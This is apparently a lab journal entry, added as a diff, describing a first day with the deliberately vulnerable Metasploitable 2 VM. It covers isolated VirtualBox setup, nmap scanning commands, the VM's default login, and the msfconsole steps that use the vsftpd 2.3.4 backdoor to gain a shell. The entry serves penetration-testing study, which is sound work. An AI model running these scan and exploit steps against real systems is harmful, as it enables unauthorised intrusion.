@@ -1,0 +1,78 @@
+Day 1 — Metasploitable 2 Lab Setup, Recon & First Exploitation
+📖 Learning & Preparation
+
+Reviewed documentation on Metasploitable 2 to understand its purpose as a deliberately vulnerable target VM.
+
+Studied the common services and exploits available.
+
+Planned workflow: Recon → Enumeration → Exploitation → Post-Exploitation.
+
+⚙️ Lab Setup
+
+Downloaded Metasploitable 2 and imported into VirtualBox.
+
+Configured networking to Host-only Adapter for safe isolation.
+
+Allocated resources: 512–1024 MB RAM, 1 CPU.
+
+Took snapshots (clean-import, boot-verified) for safe rollback.
+
+Verified login with default creds:
+
+username: msfadmin
+
+password: msfadmin
+
+🔍 Reconnaissance
+
+Performed scanning to identify open ports and vulnerable services.
+
+Commands executed:
+
+# Verify target is alive
+ping <TARGET-IP>
+
+# Basic Nmap scan
+nmap <TARGET-IP>
+
+# Full service & version detection
+sudo nmap -sS -sV -O -Pn <TARGET-IP> -oA scans/metasploitable_day1
+
+
+Findings:
+
+Open ports: FTP (21), SSH (22), Telnet (23), HTTP (80/8180), SMB (139/445), PostgreSQL (5432), VNC (5900), IRC (6667), etc.
+
+Noted vsftpd 2.3.4 running on port 21 (well-known vulnerable version).
+
+💥 Exploitation — FTP (vsftpd 2.3.4 backdoor)
+
+Using Metasploit Framework, exploited the vulnerable FTP service and obtained a shell.
+
+Commands executed (on Kali attacker):
+
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST <TARGET-IP>
+run
+
+
+Result:
+
+Exploit executed successfully.
+
+Gained a shell session on the target via the backdoor.
+
+✅ Day 1 Summary
+
+Learned the fundamentals of Metasploitable 2 and its services.
+
+Set up VM in VirtualBox with secure host-only networking.
+
+Completed initial reconnaissance with Nmap.
+
+Successfully exploited vsftpd 2.3.4 (FTP) using Metasploit, obtaining a shell.
+
+Saved scan outputs and documented results.
+
+📌 Day 1 ends with first successful exploitation. Next steps: deeper service enumeration and multi-service exploitation in Day 2.
